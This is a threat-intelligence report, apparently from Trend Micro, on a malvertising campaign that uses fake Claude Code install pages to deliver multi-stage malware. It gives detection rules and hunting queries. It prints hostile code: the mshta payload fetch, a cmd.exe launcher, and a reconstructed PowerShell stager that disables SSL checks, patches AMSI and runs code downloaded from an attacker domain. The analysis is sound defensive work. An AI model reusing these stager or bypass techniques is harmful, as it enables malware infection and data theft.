# InstallFix and Claude Code: How Fake Install Pages Lead to Real Compromise

- **Source :** trendmicro
- **URL :** https://www.trendmicro.com/en/research/26/e/installfix-and-claude-code.html
- **Date :** 2026-05-05

---

Cyber Threats

# InstallFix and Claude Code: How Fake Install Pages Lead to Real Compromise

Targeting multiple industries worldwide, the InstallFix campaign uses fake Claude AI installer pages to trick users into running malware that collects system information, disables security features, achieves persistence, and connects to attacker-controlled C&C servers for additional payloads.

By: Allixon Kristoffer Francisco, Gabriel Nicoleta, Jonna Santos, Mohamed Fahmy 2026/05/05 Read time:  ( words) 

[ ![Share](https://www.trendmicro.com/etc.clientlibs/trendresearch/clientlibs/clientlib-trendresearch/resources/img/share-more.svg) ](https://www.addtoany.com/share) ![Print](https://www.trendmicro.com/etc.clientlibs/trendresearch/clientlibs/clientlib-trendresearch/resources/img/printer.svg)

Save to Folio

__

* * *

# Key takeaways

  * The InstallFix campaign involves a social engineering attack that targets users searching for Anthropic’s Claude AI by distributing malware through fake installation pages promoted via Google Ads.
  * Attackers leverage realistic, OS-specific installation instructions to trick users into running malicious PowerShell commands, which initiate a multi-stage infection chain involving mshta.exe, obfuscated scripts, and fileless payload delivery.
  * The campaign’s infection chain includes advanced evasion techniques such as AMSI bypass, SSL certificate validation disabling, and victim-unique command-and-control URLs, complicating detection and remediation.
  * Telemetry from TrendAI Vision One™ confirmed the creation of scheduled tasks for persistence and observed network traffic to attacker-controlled C&C servers.
  * The campaign targets organizations across the Americas, Asia Pacific, Middle East, and Africa (AMEA), and Europe, including industries such as government, electronics, education, and food & beverage.



In an era where artificial intelligence tools have become indispensable to modern workflows, threat actors are exploiting this dependency with alarming sophistication. The InstallFix campaign — also known as the Fake Claude Installer threat — represents a dangerous evolution in social engineering, weaponizing trust in legitimate AI platforms to deliver state-linked espionage malware. This report examines how adversaries are impersonating Anthropic's Claude AI assistant, leveraging its 290 million monthly users to distribute malware through meticulously crafted fake installation pages. As organizations rush to integrate AI capabilities, understanding these deceptive tactics is no longer optional, but critical to survival in today's threat landscape.

As modern software installation often involves copying and running commands (for example, “curl-to-bash”), attackers take advantage of this behavior by creating fake but realistic installation pages. These pages trick users into executing malicious commands, leading to malware infections.

The threat is especially significant because it targets both developers and non-technical users who are increasingly using command-line tools, expanding the pool of potential victims.

# Targeting profile

We identified attacks against targets in the following countries and industries:

**Regions**

  * Americas
  * Asia Pacific, Middle East, and Africa (AMEA)
  * Europe



**Countries**

  * Malaysia
  * Netherlands
  * Thailand
  * US



**Industries**

  * Electronics
  * Education
  * Food and beverage
  * Government



# Distribution via Google Ads

The fake install pages are distributed exclusively through Google Ads, specifically through sponsored search results that appear when users search for terms like "Claude Code" and "Claude Code install". According to feedback from an MDR customer, a fraudulent landing page was visited by the user after clicking a sponsored link at the top of the search results; the user assumed the site was legitimate because it was promoted through Google Ads.

The fake website includes a malicious command that uses PowerShell and MSHTA to execute and install a counterfeit Claude application on Windows systems and MacOS systems, though the buttons on the fake website seem to not work. The malvertising URL is designed to mimic a Google Ads link structure. The parameters _gar_source_ and _gad_campaign_ resemble advertising tracking fields commonly associated with Google Ads. 

![Figure 1. Feedback from an MDR customer](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig01.png)

Figure 1. Feedback from an MDR customer

[ download ](/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig01.png)

![Figure 2. A sponsored result appeared at the top of Google search results when the user was looking for the Claude installer](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig02.png)

Figure 2. A sponsored result appeared at the top of Google search results when the user was looking for the Claude installer

[ download ](/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig02.png)

![Figure 3. Fraudulent landing page  ](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig03.png)

Figure 3. Fraudulent landing page 

[ download ](/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig03.png)

![Figure 4. The fake website with a malicious command for Windows systems](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig04.png)

Figure 4. The fake website with a malicious command for Windows systems

[ download ](/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig04.png)

![Figure 5. The fake website with a malicious command for macOS systems](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig05.png)

Figure 5. The fake website with a malicious command for macOS systems

[ download ](/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig05.png)

![Figure 6. Error page when buttons on the fake page are clicked](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig06.png)

Figure 6. Error page when buttons on the fake page are clicked

[ download ](/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig06.png)

# Evidence from TrendAI Vision One™

Our telemetry from [TrendAI Vision One™](https://www.trendmicro.com/en_us/business/products/one-platform.html) showed that PowerShell on an endpoint invoked mshta.exe to download and execute a malicious payload (claude[.]msixbundle) from known malicious domain _download-version[.]1-5-8[.]com_.****

![Figure 7. mshta.exe invoked to download and execute a malicious payload](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig07.png)

Figure 7. mshta.exe invoked to download and execute a malicious payload

[ download ](/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig07.png)

![Figure 8. Outbound network connections and domain queries after user execution of malicious PowerShell commands](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig08.png)

Figure 8. Outbound network connections and domain queries after user execution of malicious PowerShell commands

[ download ](/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig08.png)

![Figure 9. Obfuscated PowerShell code](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig09.png)

Figure 9. Obfuscated PowerShell code

[ download ](/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig09.png)

![Figure 10. Deobfuscated PowerShell commands](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig10.png)

Figure 10. Deobfuscated PowerShell commands

[ download ](/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig10.png)

The deobfuscated PowerShell code performs the following commands:

  * **Generates a unique ID for the victim machine** \- To check if this has been infected
  * **Disables SSL certificate validation** \- To trust any HTTPS certificate
  * **Decrypts/decodes hidden strings** \- Additional strings needed
  * **Attempts to tamper with internal .NET behavior** \- Likely security bypass
  * **Downloads a payload from a remote server** \- Another payload
  * **Executes it in memory** \- For defense evasion



# TrendAI Vision One™ detection

A TrendAI Vision One™ detection filter, **MSHTA Spawning Windows Shell** , was triggered during the observed incident. It covers the critical stage where mshta.exe spawns a Windows shell process. 

**What the rule detects**

The rule fires on _TELEMETRY_PROCESS_CREATE_ events and covers two bilateral directions of the mshta.exe / shell process relationship:

  * **Mshta as parent:** mshta.exe spawns any of: cmd.exe, powershell.exe, wscript.exe, cscript.exe, sh.exe, bash.exe, reg.exe, regsvr32.exe, or bitsadmin
  * **Mshta as child:** cmd.exe, powershell.exe, wscript.exe, cscript.exe, sh.exe, bash.exe, reg.exe, regsvr32.exe, or bitsadmin spawns mshta.exe 



**Relevance to this campaign**

In the InstallFix incident, the rule triggered mshta.exe (processFilePath) spawning cmd.exe (objectFilePath) as part of the VBScript COM launcher stage. TrendAI Apex One’s™ Malware Behavior Blocking acted on the detection with a Terminate action, killing the malicious PowerShell child process (policy: FLS.ISB.4886T).

Infection chain

![Figure 11. Stages of the infection chain](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig11.jpg)

Figure 11. Stages of the infection chain

[ download ](/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig11.jpg)

**Stage 1: Initial Access Google Ads Malvertisement (T1566.002 / T1583.008)**

  * **Technique:** Phishing via Google Ads sponsored results (T1566.002); Malvertisement (T1583.008)
  * **Delivery:** Fake “Claude Code” install page served via paid Google search placement
  * **Lure:** Realistic install page with OS-specific commands Windows and macOS variants present



Attackers purchased Google Ads placements to intercept users searching for Claude Code. The sponsored result leads to a fake landing page styled as a legitimate install guide. Using the ClickFix social engineering pattern, the page presents an OS-specific command and instructs the user to run it framing execution as a required installation step. On Windows, executing the command causes the browser or shell to invoke mshta.exe against the remote payload URL.

**Stage 2: MSHTA Fetches and Executes ZIP/HTA Polyglot (T1218.005)**

  * **Technique:** System Binary Proxy Execution: Mshta (T1218.005)
  * **File:** claude.msixbundle
  * **Host:** download-version.1-5-8[.]com
  * **File structure:** Valid ZIP archive with HTA payload appended at byte offset 882290 (ZIP/HTA polyglot)



The ClickFix command invokes mshta.exe with a remote URL pointing to claude.msixbundle. Despite its extension, the file is a ZIP/HTA polyglot — the archive contains real Microsoft Bing packages bearing valid Microsoft Marketplace signatures, lending it a convincing appearance of legitimacy. The first 882290 bytes VirusTotal identifies it as an Archive file with 'PK' magic bytes), while mshta.exe reads the HTA content appended at the end of the file. This dual-format structure allows the file to pass as a benign package while mshta.exe executes the appended malicious HTA directly.

> Process chain observed in telemetry:  
>  explorer.exe  
>  powershell.exe (user ran ClickFix command from fake install page)  
>  mshta.exe https[://]download-version[.]1-5-8[.]com/claude[.]msixbundle

**Stage 3: HTA VBScript Executes Silently - COM Shell Launcher (T1559.001 / T1059.005)**

  * **Technique:** Component Object Model abuse via Shell.Application (T1559.001)
  * **Technique:** VBScript execution embedded in HTA (T1059.005)
  * **Evasion:** Window resized to 0x0 pixels no visible UI presented to the user
  * **COM Object:** Shell.Application | GUID: 9BA05972-F51F-4DE8-95A4-F561CC55EBC4



The appended HTA executes VBScript silently inside mshta.exe. The script uses two named decoding functions to deobfuscate its payload before launching the next stage:

  * **DisplayEmailGnu()** \- hex-decodes obfuscated strings embedded in the HTA
  * **GetBiosDebian()** \- base64-decodes the cmd.exe command
  * **Shell.Application COM object (GUID: 9BA05972-F51F-4DE8-95A4-F561CC55EBC4)** \- executes the decoded command via ShellExecute



The decoded command launched by the HTA:

> cmd.exe /v:on /c "set x=pow&&set y=ershell&&call %windir%\SysWOW64\WindowsPowerShell\v1.0\\!x!!y! -E "

The DispHTMLWindow2.resizeTo(0,0) call ensures the MSHTA window remains invisible to the user throughout execution. AMSI telemetry confirmed the VBScript executed within the mshta.exe process context and captured the decoded COM call sequence.

**Stage 4: cmd.exe Reconstructs PowerShell Encoded Stager Executes (T1027 / T1059.001)**

  * **Technique:** Obfuscated Files or Information variable splitting + encoded command (T1027)
  * **Technique:** Command and Scripting Interpreter: PowerShell via SysWOW64 (T1059.001)
  * **Technique:** Disable or Modify Tools - AMSI patched via WriteInt32 (T1562)



cmd.exe runs with delayed variable expansion (/v:on) and uses the variable-splitting trick (set x=pow && set y=ershell) to reconstruct the string 'powershell' at runtime, evading static command-line detection. It then invokes the 32-bit SysWOW64 PowerShell binary with a UTF-16LE base64-encoded payload via the -E flag.

The decoded PowerShell stager performs the following operations in sequence:

  1. **Victim fingerprinting:** Computes MD5(COMPUTERNAME + USERNAME), takes the first 16 hex characters in lowercase as a unique victim token ($nipple)
  2. **SSL bypass:** Sets [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
  3. **AMSI bypass:** RC4-decrypts AMSI bypass strings (via custom GlobalJson and TenantId cipher functions) using key BWJFEesMEqRvjQbm, then writes 0x41414141 to amsiContext via [Runtime.InteropServices.Marshal]::WriteInt32 blinding AMSI for the remainder of the session
  4. **Fileless payload retrieval:** Downloads Stage 4 from the victim-unique C&C URL and executes it in memory via Invoke-Expression (IEX)



> # Decoded PowerShell stager logic (reconstructed from base64 telemetry)  
>    
>  # Step 1 Victim fingerprint  
>  $nipple = (Get-FileHash -InputStream([IO.MemoryStream]::new(  
>  [Text.Encoding]::UTF8.GetBytes($env:COMPUTERNAME + $env:USERNAME)  
>  )) -Algorithm MD5).Hash.Substring(0,16).ToLower()  
>    
>  # Step 2 SSL bypass  
>  [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}  
>    
>  # Step 3 AMSI patch (RC4 key: BWJFEesMEqRvjQbm)  
>  # RC4 decrypts AMSI bypass strings -> writes 0x41414141 to amsiContext  
>  [Runtime.InteropServices.Marshal]::WriteInt32(<amsiContext>, 0x41414141)  
>    
>  # Step 4 Fileless stage-4 fetch and execute  
>  $Filter = (New-Object Net.WebClient).DownloadString(  
>  "https://$nipple.oakenfjrod[.]ru/cloude-91267b64-989f-49b4-89b4-984e0154d4d1"  
>  )  
>  IEX $Filter

The victim-unique subdomain (16-character hex derived from machine identity) means each host contacts a distinct URL, complicating bulk network-level blocking and potentially enabling per-victim payload customization by the actor.

**Stage 5: Final Payload Fileless Execution (Not Recovered)**

  * **Source:** https://[nipple].oakenfjrod[.]ru/cloude-91267b64-989f-49b4-89b4-984e0154d4d1
  * **SHA1:** 811fbf0ff6b6acabe4b545e493ec0dd0178a0302 (file recovered from path; content execution not confirmed)
  * **SHA256:** 2f04ba77bb841111036b979fc0dab7fcbae99749718ae1dd6fd348d4495b5f74
  * **Status:** Not fully recovered - TrendAI Apex One™ terminated the process chain at Stage 3 before IEX completed



# Malware analysis

Claude.msixbundle.zip is the file downloaded from _hxxps[://]download-version[.]1-5-8[.]com/claude[.]msixbundle_. File analysis confirmed the presence of a valid file signature, with the file header beginning with the “PK” identifier. This indicates that the file is a ZIP-based archive format, consistent with compressed package structures commonly used to distribute software or payloads. 

![Figure 12. The VirusTotal result showing that the file is a ZIP file](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig12.png)

Figure 12. The VirusTotal result showing that the file is a ZIP file

[ download ](/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig12.png)

![Figure 13. The file header to the payload](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig13.png)

Figure 13. The file header to the payload

[ download ](/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig13.png)

![Figure 14. The file signature for zip file containing “PK”](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig14.png)

Figure 14. The file signature for zip file containing “PK”

[ download ](/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig14.png)

Based on the threat intelligence, this malware uses different file formats like mp3 to bypass security.

![Figure 15. The archive file](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig15.png)

Figure 15. The archive file

[ download ](/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig15.png)

When checking the archive file, it was found that the file contains a single archive. This archive appears to hold a normal file. 

![Figure 16. The extraction of the file](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig16.png)

Figure 16. The extraction of the file

[ download ](/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig16.png)

The contents of the file appear to consist of normal file components. At this stage, nothing obviously malicious or unusual is observed in the extracted files, and they resemble a standard application.

![Figure 17. The third stage of analysis](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig17.png)

Figure 17. The third stage of analysis

[ download ](/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig17.png)

The embedded HTML code was identified inside the ZIP file. This suggests that the file may be part of a multi-stage execution chain, where HTML is used as a container or delivery mechanism for additional payloads or scripts.

![Figure 18. The VBScript payload in Claude.msixbundle.zip](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig18.jpg)

Figure 18. The VBScript payload in Claude.msixbundle.zip

[ download ](/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig18.jpg)

The ZIP file (Claude.msixbundle.zip) was found to include an embedded, obfuscated VBScript payload delivered through an HTML file. The script appears to be intentionally obfuscated, suggesting malicious intent and likely designed to evade detection or analysis.

![Figure 19. The hex values under DisplayEmailGNU](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig19.png)

Figure 19. The hex values under DisplayEmailGNU

[ download ](/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig19.png)

Decoding and reconstructing the hex values under the variable _DisplayEmailGNU_ using CyberChef reveals that the command is a PowerShell execution command. This activity was also observed and captured by Vision One, confirming the execution behavior associated with the payload.

![Figure 20. Decoded PowerShell command](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig20.png)

Figure 20. Decoded PowerShell command

[ download ](/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig20.png)

The decoded PowerShell command invokes another file to perform additional obfuscation and execution:

**(https://$nipple[.]oakenfjrod[.]ru/cloude-91267b64-989f-49b4-89b4-984e0154d4d1)**

  * **< nipple>** \- MD5-based machine ID
  * **oakenfjrod[.]ru** \- attacker-controlled domain
  * **/cloude-...** \- remote payload path



![Figure 21. A snippet of the obfuscated command](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig21.png)

Figure 21. A snippet of the obfuscated command

[ download ](/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig21.png)

During the fourth stage of execution (cloude-91267b64-989f-49b4-89b4-984e0154d4d1), an additional layer of obfuscation was observed. This indicates that the payload employs multiple stages of encoding or concealment to hinder analysis and evade detection

To deobfuscate the byte, we need the key to be used in the XOR function, which will be stored in _$ISLuq0izl8_.

![Figure 22. A snippet of the obfuscated logic for decoding the obfuscated commands](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig22.png)

Figure 22. A snippet of the obfuscated logic for decoding the obfuscated commands

[ download ](/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig22.png)

![Figure 23. A snippet of the variable where the decoded result will be stored](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig23.png)

Figure 23. A snippet of the variable where the decoded result will be stored

[ download ](/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig23.png)

To produce the key, it concatenates all the characters, and the result will be stored in _$ISLuq0izl8_.

![Figure 24. A snippet of the first character to be decoded via XOR function](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig24.png)

Figure 24. A snippet of the first character to be decoded via XOR function

[ download ](/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig24.png)

As part of the deobfuscation process, the first character was decoded to derive the key required for further decryption. This step serves as an example of the underlying logic used to reconstruct the full payload from its obfuscated form.

**Logic to get the XOR KEY**

  * Combine numbers and remove the variables:



24 + 48 = 72  
39 − 39 = 0  
49 + 38 = 87

  * Next:



72 − C − K − 87 + C + K + 80

  * Cancel:



−C + C = 0  
−K + K = 0

  * Remaining:



72 − 87 + 80 = 65 → **"A"**

**From Decimal 65 = A**

Based on this logic, the result of the first character located on $euZ1AMZyMcJWItteQdCD is “A”.

![Figure 25. A snippet of the decoded XOR key needed to get the shellcode](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig25.png)

Figure 25. A snippet of the decoded XOR key needed to get the shellcode

[ download ](/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig25.png)

Decoding and resolving all variables that are concatenated into _$ISLuq0izl8_ reveals that the XOR key used in the obfuscation process is _AMSI_RESULT_NOT_DETECTED - UTF8_. This indicates the script is leveraging a known AMSI-related string as part of its deobfuscation or evasion technique.****

With the XOR key now obtained, we can proceed to deobfuscate the encoded bytes and continue with further analysis of the payload.

![Figure 26. A snippet of the Cyberchef Recipe to decode the bytes to get the shellcode payload](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig26.png)

Figure 26. A snippet of the Cyberchef Recipe to decode the bytes to get the shellcode payload

[ download ](/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig26.png)

Based on the decryption routine, the data is first converted from decimal and Base64 formats, then XOR-decrypted using the key _“AMSI_RESULT_NOT_DETECTED”_. Following this process, the resulting output resolves into shellcode intended for in-memory execution.

![Figure 27. Shellcode that is designed to be loaded into memory for execution](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig27.png)

Figure 27. Shellcode that is designed to be loaded into memory for execution

[ download ](/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig27.png)

# Persistence

In addition to other indicators of compromise, scheduled tasks were observed being created on the host system. This behavior suggests that the malware is attempting to achieve persistence, allowing it to maintain ongoing connectivity and re-execute automatically, even after system reboots or user logouts.

![Figure 28. The scheduled task creation was successfully captured by TrendAI Vision One™](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig28.png)

Figure 28. The scheduled task creation was successfully captured by TrendAI Vision One™

[ download ](/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig28.png)

![Figure 29. The obfuscated command responsible for creating the scheduled task, which is used by the malware to establish persistence on the system](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig29.png)

Figure 29. The obfuscated command responsible for creating the scheduled task, which is used by the malware to establish persistence on the system

# Dynamic analysis

Upon execution of the shellcode in memory, the system began exhibiting observable changes consistent with in-memory payload activity. The following artifacts and behaviors were identified during runtime analysis. The following event was observed:

![Figure 30. Behavior indicating that the malware is attempting to collect data related to e-wallet applications](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig30.png)

Figure 30. Behavior indicating that the malware is attempting to collect data related to e-wallet applications

[ download ](/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig30.png)

![Figure 31. Behavior indicating that the malware is collecting browser data](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig31.png)

Figure 31. Behavior indicating that the malware is collecting browser data

[ download ](/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig31.png)

The outbound connections are 104[.]21[.]0[.]95 and 185[.]177[.]239[.]255. TCP send and TCP receive activity was observed on the infected host. This indicates that the malware is actively establishing network connections and exchanging data with external systems. Such activity suggests potential communication with command-and-control servers, data exfiltration, or coordination with other malicious infrastructure.

Multiple outbound connections were observed during repeated execution of the payload. In this analysis, the payload was executed three times, with each execution generating different outbound network connections.

![Figure 32. A snippet of the attempt to connect to C&C connection](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig32.png)

Figure 32. A snippet of the attempt to connect to C&C connection

[ download ](/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig32.png)

![Figure 33. The malware attempted to establish a connection to the IP address 77\[.\]91\[.\]97\[.\]244, which resolves to hosted-by\[.\]yeezyhost\[.\]net](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig33.png)

Figure 33. The malware attempted to establish a connection to the IP address 77[.]91[.]97[.]244, which resolves to hosted-by[.]yeezyhost[.]net

[ download ](/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig33.png)

![Figure 34. A snippet of the Wireshark for unsuccessful connection](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig34.png)

Figure 34. A snippet of the Wireshark for unsuccessful connection

[ download ](/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig34.png)

All captured packets consist of TCP SYN requests to 77[.]91[.]97[.]244 over port 443 (HTTPS). The presence of multiple TCP retransmissions indicates that no SYN-ACK responses were received from the destination server, suggesting that the connection attempts were unsuccessful or destination IP address appears to be unreachable, suggesting it may be offline or non-responsive.

![Figure 35. An indicator linked to RedLine stealer](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig35.jpg)

Figure 35. An indicator linked to RedLine stealer

[ download ](/content/dam/trendmicro/global/en/research/26/e/installfix/InstallFix_Fig35.jpg)

The identified indicators of compromise (IoCs) are associated with [RedLine stealer](https://www.trendmicro.com/en_us/research/23/e/malicious-ai-tool-ads-used-to-deliver-redline-stealer.html) and exhibit techniques similar to those observed in its [campaigns from 2023](https://blog.eclecticiq.com/redline-stealer-variants-demonstrate-a-low-barrier-to-entry-threat).

# Conclusion

The InstallFix campaign reveals how cybercriminals are exploiting the popularity of AI tools to launch targeted, high-impact malware attacks. By disguising malicious installers as legitimate Claude AI downloads and using Google Ads as a means of distribution, attackers bypass both user skepticism and their machine’s security controls. By employing techniques such as AMSI bypass, SSL certificate validation disabling, and scheduled task creation for persistence, the malware is able to evade detection and maintain access to infected systems. Organizations must remain vigilant against threats like this by making users aware of installation risks, monitoring for suspicious process and network activity, and prioritizing layered defenses.

# Recommendations

To mitigate the risks posed by campaigns like InstallFix, organizations should adopt proactive security measures and focus on user education. The following best practices are designed to help prevent malware infections, detect suspicious activity, and strengthen defenses against deceptive installer threats:

**Network protection**

  * Block access to known malicious domains and IP addresses associated with the campaign at your firewall or security gateway.
  * Use DNS filtering or a secure web gateway to help prevent users from reaching suspicious or newly registered domains.



**Endpoint security**

  * Limit or block the use of legacy scripting tools like mshta.exe unless absolutely necessary, as these are commonly abused by attackers.
  * Ensure your TrendAI endpoint protection solution is configured to automatically block or terminate suspicious behavior, not just alert.



**User awareness**

  * Educate users to avoid copying and running installation commands from unfamiliar websites, especially those reached via sponsored search results.
  * Encourage users to always verify that software download pages match the official vendor’s website before installing anything.
  * Recommend using trusted package managers (such as npm, pip, brew, or winget) instead of manual installation scripts from third-party sites.



**Detection and response**

  * Stay up to date with the latest threat intelligence and apply detection rules or indicators of compromise (IOCs) relevant to ongoing campaigns.



# Proactive security with TrendAI Vision One™ 

[TrendAI Vision One™](https://www.trendmicro.com/en_us/business/products/one-platform.html) platform is the industry-leading AI cybersecurity platform that centralizes cyber risk exposure management, security operations, and robust layered protection. 

**TrendAI Vision One™ Threat Intelligence Hub**

[TrendAI Vision One™ Threat Intelligence Hub](https://www.trendmicro.com/en_us/business/products/threat-intelligence.html) provides the latest insights on emerging threats and threat actors, exclusive strategic reports from TrendAI™ Research, and TrendAI Vision One™ Threat Intelligence Feed in the TrendAI Vision One™ platform. 

**Emerging thrreat:**[**InstallFix and Claude Code: How Fake Install Pages Lead to Real Compromise**](https://portal.xdr.trendmicro.com/index.html#/app/ti/intelligence_insights?name=InstallFix%20and%20Claude%20Code%3A%20How%20Fake%20Install%20Pages%20Lead%20to%20Real%20Compromise)****

**TrendAI Vision One™ Intelligence Reports (IOC Sweeping)**

[**InstallFix and Claude Code: How Fake Install Pages Lead to Real Compromise**](https://portal.xdr.trendmicro.com/index.html#/app/ti/intelligence?intrusionSet=InstallFix%20and%20Claude%20Code%3A%20How%20Fake%20Install%20Pages%20Lead%20to%20Real%20Compromise)****

TrendAI Vision One™ customers can use the Search App to match or hunt the malicious indicators mentioned in this blog post with data in their environment. 

Hunting Queries

**TrendAI Vision One™ Search App**

TrendAI Vision One™ customers can use the Search App to match or hunt the malicious indicators mentioned in this blog post with data in their environment. 

**Full kill-chain correlation**  
  
// Vision One XDR Search — pivot from mshta to PS to C2 on one endpoint  
// Step 1: find hosts where mshta ran with malicious URL args  
eventSubId:TELEMETRY_PROCESS_CREATE  
AND processName:mshta.exe  
AND (processCmd:*1-5-8[.]com* OR processCmd:*msixbundle*  
OR processCmd:*get-version[.]com*)  
  
// Step 2: pivot on endpointHostname from above — find PS child and C2 beacon  
endpointHostName:<HOSTNAME_FROM_STEP1>  
AND (  
(eventSubId:TELEMETRY_PROCESS_CREATE  
AND processName:powershell.exe  
AND (processCmd:*-enc* OR processCmd:*IEX*))  
OR  
(eventSubId:TELEMETRY_NETWORK  
AND request:*oakenfjrod[.]ru*)  
)  
  
**mshta.exe spawning shell — Vision One XDR Search**  
  
eventSubId:TELEMETRY_PROCESS_CREATE  
AND parentProcessName:mshta.exe  
AND (processName:cmd.exe OR processName:powershell.exe  
OR processName:wscript.exe OR processName:cscript.exe)  
  
**Encoded PowerShell / IEX in command line**  
  
eventSubId:TELEMETRY_PROCESS_CREATE  
AND processName:powershell.exe  
AND (processCmd:*-enc* OR processCmd:*-EncodedCommand*  
OR processCmd:*IEX* OR processCmd:*Invoke-Expression*  
OR processCmd:*AMSI_RESULT_NOT_DETECTED*)

More hunting queries are available for TrendAI Vision One™ with [Threat Intelligence Hub](https://www.trendmicro.com/en_us/business/products/threat-intelligence.html) entitlement enabled.

# Indicators of Compromise (IOCs)

The indicators of compromise for this entry can be found [here](/content/dam/trendmicro/global/en/research/26/e/installfix/IOCS_InstallFix.txt). 

Tags

[Articles, News, Reports](/en/research.html?category=trend-micro-research:medium/article) | [Cyber Threats](/en/research.html?category=trend-micro-research:threats/cyber-threats) | [Research](/en/research.html?category=trend-micro-research:article-type/research)

###  Authors 

  * Allixon Kristoffer Francisco

Threat Intel Analyst

  * Gabriel Nicoleta

Sr. Security Analyst

  * Jonna Santos

Sr. Security Analyst

  * Mohamed Fahmy

Threat Researcher




[ Contact Us ](mailto:tm_research@trendmicro.com)

### Related Articles

  * [ Unveiling Earth Kapre aka RedCurl’s Cyberespionage Tactics With Trend Micro MDR, Threat Intelligence ](/en/research/24/c/unveiling-earth-kapre-aka-redcurls-cyberespionage-tactics-with-t.html)
  * [ A Secure Access Service Edge (SASE) Guide for Leaders ](/en/research/22/h/secure-access-service-edge-sase-security-company.html)
  * [ Why the Open Secure AI Alliance Matters: Open Frontier Models, Open Deployment Flexibility ](/en/research/26/g/open-secure-ai-alliance.html)



[ See all articles ](/en/research.html)

[ ](/en/research.html)